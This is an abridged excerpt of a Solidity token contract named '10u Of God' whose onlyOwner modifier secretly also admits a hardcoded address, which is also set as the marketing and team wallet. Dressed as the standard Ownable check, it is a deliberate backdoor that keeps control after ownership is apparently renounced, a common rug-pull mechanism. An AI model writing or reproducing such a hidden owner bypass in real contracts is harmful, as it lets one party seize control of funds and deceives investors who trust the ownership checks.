...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xdc540DA450270a9972b2E799F16dBb8aDE7a719A) , "Ownable: caller is not the owner");
        _;
    }
...
contract ftocken is Context, IERC20, Ownable {
    ...
    string private _name = "10u Of God";
    string private _symbol = "10u Of God";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdc540DA450270a9972b2E799F16dBb8aDE7a719A);
    address payable public teamWalletAddress = payable(0xdc540DA450270a9972b2E799F16dBb8aDE7a719A);
